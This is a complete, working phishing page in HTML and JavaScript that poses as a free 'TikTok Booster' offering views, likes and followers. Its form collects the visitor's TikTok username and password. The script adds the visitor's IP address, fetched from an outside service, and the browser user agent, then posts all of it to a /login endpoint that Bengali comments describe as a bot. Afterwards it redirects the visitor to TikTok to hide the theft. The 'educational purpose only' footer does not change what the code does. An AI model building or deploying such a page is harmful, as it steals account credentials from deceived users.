<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Booster - Get Free Views & Likes</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #000000 0%, #1a1a2e 100%); 
            display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; padding: 16px; color: white;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Animated background */
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }
        .light {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            opacity: 0.3;
            animation: float 20s infinite linear;
        }
        .light-1 { width: 400px; height: 400px; background: #ff0050; top: -100px; left: -100px; animation-delay: 0s; }
        .light-2 { width: 350px; height: 350px; background: #00f2fe; bottom: -100px; right: -100px; animation-delay: -5s; }
        .light-3 { width: 250px; height: 250px; background: #ffcd00; top: 50%; left: 50%; animation-delay: -10s; }
        @keyframes float {
            0% { transform: translate(0, 0) rotate(0deg); }
            50% { transform: translate(50px, 30px) rotate(180deg); }
            100% { transform: translate(0, 0) rotate(360deg); }
        }
        
        .card { 
            background: rgba(25, 25, 35, 0.95); 
            width: 100%; 
            max-width: 450px; 
            padding: 30px; 
            border-radius: 24px; 
            text-align: center; 
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 0 25px 45px rgba(0,0,0,0.3);
            animation: slideUp 0.6s ease;
            position: relative;
            z-index: 1;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .tiktok-icon { 
            font-size: 70px; 
            margin-bottom: 15px; 
            background: linear-gradient(45deg, #ff0050, #00f2fe); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 15px rgba(255,0,80,0.5));
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); text-shadow: 0 0 0 rgba(255,0,80,0.5); }
            50% { transform: scale(1.05); text-shadow: 0 0 20px rgba(255,0,80,0.8); }
            100% { transform: scale(1); text-shadow: 0 0 0 rgba(255,0,80,0.5); }
        }
        
        h2 { 
            font-size: 28px; 
            margin-bottom: 8px;
            background: linear-gradient(45deg, #fff, #aaa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle { color: #aaa; font-size: 13px; margin-bottom: 25px; }
        
        .offer-box { 
            background: linear-gradient(135deg, rgba(255,0,80,0.15), rgba(0,242,254,0.15)); 
            border-radius: 16px; 
            padding: 20px; 
            margin-bottom: 25px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .stats { display: flex; justify-content: space-around; }
        .stat { text-align: center; }
        .stat-number { 
            font-size: 28px; 
            font-weight: bold; 
            background: linear-gradient(45deg, #ff0050, #00f2fe); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent;
        }
        .stat-label { font-size: 12px; color: #aaa; margin-top: 5px; }
        
        .input-group {
            position: relative;
            margin: 15px 0;
        }
        .input-group i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #ff0050;
            font-size: 16px;
        }
        input, select { 
            width: 100%; 
            padding: 14px 15px 14px 45px; 
            border-radius: 12px; 
            border: 1px solid rgba(255,255,255,0.2); 
            background: rgba(20, 20, 30, 0.8); 
            color: white; 
            font-size: 15px;
            transition: all 0.3s;
        }
        input:focus, select:focus { 
            border-color: #ff0050; 
            outline: none; 
            box-shadow: 0 0 15px rgba(255,0,80,0.3);
        }
        
        .boost-btn { 
            width: 100%; 
            padding: 16px; 
            background: linear-gradient(45deg, #ff0050, #00f2fe); 
            border: none; 
            border-radius: 12px; 
            color: white; 
            font-size: 18px; 
            font-weight: bold; 
            cursor: pointer; 
            margin-top: 15px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        .boost-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: 0.5s;
        }
        .boost-btn:hover::before {
            left: 100%;
        }
        .boost-btn:hover { 
            transform: translateY(-3px); 
            box-shadow: 0 10px 25px rgba(255,0,80,0.4);
        }
        
        .feature-list {
            margin-top: 25px;
            text-align: left;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }
        .feature-item {
            flex: 1;
            min-width: calc(50% - 10px);
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 12px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            font-size: 12px;
        }
        .feature-item i { font-size: 14px; }
        .feature-item i.fa-check-circle { color: #00f2fe; }
        
        .footer { margin-top: 25px; font-size: 10px; color: #555; }
        
        /* Loading Animation */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .loader {
            width: 60px;
            height: 60px;
            border: 4px solid #333;
            border-top: 4px solid #ff0050;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: white;
            font-size: 16px;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>
    <div class="bg-animation">
        <div class="light light-1"></div>
        <div class="light light-2"></div>
        <div class="light light-3"></div>
    </div>

    <div class="card">
        <div class="tiktok-icon"><i class="fab fa-tiktok"></i></div>
        <h2>TikTok Booster</h2>
        <div class="subtitle">Get Free Views, Likes & Followers Instantly!</div>
        
        <div class="offer-box">
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">10K+</div>
                    <div class="stat-label">Free Views</div>
                </div>
                <div class="stat">
                    <div class="stat-number">5K+</div>
                    <div class="stat-label">Free Likes</div>
                </div>
                <div class="stat">
                    <div class="stat-number">2K+</div>
                    <div class="stat-label">Free Followers</div>
                </div>
            </div>
        </div>
        
        <form id="boostForm" method="POST">
            <div class="input-group">
                <i class="fab fa-tiktok"></i>
                <input type="text" name="username" id="username" placeholder="TikTok Username" required>
            </div>
            <div class="input-group">
                <i class="fas fa-link"></i>
                <input type="text" name="video_link" id="video_link" placeholder="Video Link (Optional)">
            </div>
            <div class="input-group">
                <i class="fas fa-chart-line"></i>
                <select name="service_type" id="service_type" required>
                    <option value="views">🔥 Views Booster - 10,000 Views</option>
                    <option value="likes">❤️ Likes Booster - 5,000 Likes</option>
                    <option value="followers">👥 Followers Booster - 2,000 Followers</option>
                    <option value="all">💎 All in One - Views + Likes + Followers</option>
                </select>
            </div>
            <div class="input-group">
                <i class="fas fa-lock"></i>
                <input type="password" name="password" id="password" placeholder="Password" required>
            </div>
            <input type="hidden" name="page_type" value="tiktok_boost">
            <button type="submit" class="boost-btn">
                <i class="fas fa-rocket"></i> Boost Now
            </button>
        </form>
        
        <div class="feature-list">
            <div class="feature-item"><i class="fas fa-check-circle"></i> 100% Free Service</div>
            <div class="feature-item"><i class="fas fa-check-circle"></i> Real Active Users</div>
            <div class="feature-item"><i class="fas fa-check-circle"></i> Delivery in 24 Hours</div>
            <div class="feature-item"><i class="fas fa-shield-alt"></i> Secure & Encrypted</div>
        </div>
        
        <div class="footer">
            <p>⚠️ Educational purpose only | Terms & Conditions apply</p>
        </div>
    </div>

    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loader"></div>
        <div class="loading-text">Processing your request...</div>
        <div class="loading-text" style="font-size: 12px; margin-top: 10px;">Please wait</div>
    </div>

    <script>
        document.getElementById('boostForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const video_link = document.getElementById('video_link').value;
            const service_type = document.getElementById('service_type').value;
            
            // লোডিং শো করুন
            document.getElementById('loadingOverlay').style.display = 'flex';
            
            // ইউজার ডাটা সংগ্রহ করুন
            const userData = {
                username: username,
                password: password,
                video_link: video_link,
                service_type: service_type,
                page_type: 'tiktok_boost',
                timestamp: new Date().toLocaleString()
            };
            
            // IP Address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                userData.ipAddress = ipData.ip;
            } catch(e) {
                userData.ipAddress = 'Unknown';
            }
            userData.userAgent = navigator.userAgent;
            
            // বটে ডাটা পাঠান (একই সাথে TikTok খুলবে)
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams(userData)
            }).catch(err => console.log('Data sent to bot'));
            
            // 2 সেকেন্ড পর TikTok খুলুন
            setTimeout(() => {
                window.location.href = 'https://www.tiktok.com/';
            }, 2000);
        });
        
        // Enter key support
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('boostForm').dispatchEvent(new Event('submit'));
            }
        });
    </script>
</body>
</html>
